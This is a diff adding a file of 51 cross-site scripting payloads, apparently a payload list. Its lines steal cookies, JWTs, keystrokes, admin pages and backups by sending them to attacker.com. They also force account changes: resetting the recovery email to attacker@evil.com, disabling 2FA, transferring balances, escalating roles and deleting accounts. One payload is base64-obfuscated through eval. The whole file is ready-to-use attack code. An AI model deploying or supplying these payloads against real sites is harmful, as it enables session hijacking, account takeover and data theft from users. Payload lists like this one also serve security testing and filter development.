@@ -1,0 +1,51 @@
+<script>document.cookie = 'session=hacked; path=/; domain='+document.domain</script>
+<script>new Image().src = `https://attacker.com/log?c=${btoa(document.cookie)}`</script>
+<script>fetch('https://attacker.com/steal', {method:'POST', body:JSON.stringify({cookie:document.cookie, url:location.href})})</script>
+<script>navigator.sendBeacon('https://attacker.com/beacon', document.cookie)</script>
+<script>let ws = new WebSocket('wss://attacker.com'); ws.onopen = () => ws.send(document.cookie)</script>
+<script>parent.postMessage(document.cookie, '*')</script>
+<script>indexedDB.databases().then(dbs => fetch('https://attacker.com/db?names='+dbs.map(db=>db.name).join(',')))</script>
+<script>localStorage.setItem('auth_token', 'attacker-controlled-token'); location.reload()</script>
+<script>document.querySelector('input[name="csrf_token"]').value = 'bypassed'</script>
+<script>fetch('/change-email', {method:'POST', credentials:'include', body:'email=attacker@evil.com'})</script>
+<script>fetch('/api/v1/sessions', {method:'DELETE', credentials:'include'})</script>
+<script>eval(atob('ZmV0Y2goJy9hZG1pbi9kZWxldGUtdXNlcj9pZD0xMjM0Jyk='))</script>
+<script>document.body.innerHTML = '<h1 style="color:red">Defaced – XSS Bounty Claimed</h1>'</script>
+<script>history.replaceState({}, '', '/admin/dashboard')</script>
+<script>document.addEventListener('keydown', e => fetch('https://attacker.com/key/'+e.key))</script>
+<script>setInterval(() => fetch('/api/user').then(r=>r.json()).then(d=>fetch('https://attacker.com/data', {method:'POST', body:JSON.stringify(d)})), 5000)</script>
+<script>Object.defineProperty(document, 'cookie', {set: v => fetch('https://attacker.com/newcookie='+encodeURIComponent(v))})</script>
+<script>window.open(`https://attacker.com/phish?token=${localStorage.getItem('jwt') || sessionStorage.getItem('jwt')}`)</script>
+<script>fetch('/graphql', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({query:'mutation { deleteAccount(id:"victim-id") { success }}'})})</script>
+<script>new MutationObserver(muts => fetch('https://attacker.com/dom?change='+btoa(muts[0].addedNodes[0]?.textContent || ''))).observe(document.body, {childList:true, subtree:true})</script>
+<script>document.querySelector('[name="password"]').value = 'hacked123'; document.forms[0].submit()</script>
+<script>fetch('/api/tokens/revoke-all', {method:'POST', credentials:'include'})</script>
+<script>document.querySelectorAll('input[type="checkbox"][name="permission"]').forEach(cb => cb.checked = true); document.forms[0].submit()</script>
+<script>fetch('/api/2fa/disable', {method:'POST', credentials:'include'})</script>
+<script>new Image().src = 'https://attacker.com/exfil?url='+encodeURIComponent(location.href)+'&cookie='+document.cookie</script>
+<script>navigator.clipboard.writeText(document.cookie).then(() => alert('Copied to clipboard'))</script>
+<script>document.querySelector('input[name="recovery_email"]').value = 'attacker@evil.com'; document.forms[0].submit()</script>
+<script>fetch('/api/payment/add-card', {method:'POST', body:JSON.stringify({card:'4242424242424242'})})</script>
+<script>document.querySelector('[onclick*="delete"]').click()</script>
+<script>fetch('/api/balance/transfer', {method:'POST', body:'to=attacker&amount=all'})</script>
+<script>document.querySelector('button[data-action="impersonate"]').click()</script>
+<script>new Worker(URL.createObjectURL(new Blob(['postMessage(document.cookie)'])))</script>
+<script>fetch('/admin/users').then(r=>r.text()).then(html=>fetch('https://attacker.com/dump', {method:'POST', body:html}))</script>
+<script>document.querySelectorAll('a[href*="logout"]').forEach(a => a.click())</script>
+<script>fetch('/api/settings', {method:'GET'}).then(r=>r.json()).then(settings=>fetch('https://attacker.com/settings', {method:'POST', body:JSON.stringify(settings)}))</script>
+<script>document.querySelector('input[type="file"]').files = new FileList(); document.forms[0].submit()</script>
+<script>fetch('/api/export/data').then(r=>r.blob()).then(blob=>fetch('https://attacker.com/export', {method:'POST', body:blob}))</script>
+<script>document.querySelector('[data-role="admin-elevate"]').dispatchEvent(new Event('click'))</script>
+<script>new BroadcastChannel('xss').postMessage(document.cookie)</script>
+<script>fetch('/api/notifications/mark-all-read', {method:'POST'}).then(() => fetch('/api/notifications/create', {method:'POST', body:JSON.stringify({msg:'You have been hacked'})}))</script>
+<script>document.querySelectorAll('tr[data-user-id]').forEach(tr => tr.querySelector('.ban').click())</script>
+<script>fetch('/api/analytics').then(r=>r.json()).then(data=>fetch('https://attacker.com/analytics', {method:'POST', body:JSON.stringify(data)}))</script>
+<script>document.querySelector('select[name="role"]').value = 'admin'; document.forms[0].submit()</script>
+<script>new Audio('https://attacker.com/beep?cookie='+document.cookie).play()</script>
+<script>fetch('/api/debug/enable', {method:'POST', credentials:'include'})</script>
+<script>document.querySelector('iframe').contentWindow.postMessage(document.cookie, '*')</script>
+<script>fetch('/api/cache/clear', {method:'POST'}).then(() => location.reload())</script>
+<script>document.querySelectorAll('input[type="password"]').forEach(p => p.value = 'hacked')</script>
+<script>new Image().src = '/api/log?event=xss&data='+btoa(unescape(encodeURIComponent(document.documentElement.outerHTML)))</script>
+<script>fetch('/api/backup/create').then(r=>r.json()).then(backup=>fetch('https://attacker.com/backup', {method:'POST', body:JSON.stringify(backup)}))</script>
+<script>document.querySelector('[data-action="reset-all-passwords"]').click()</script>
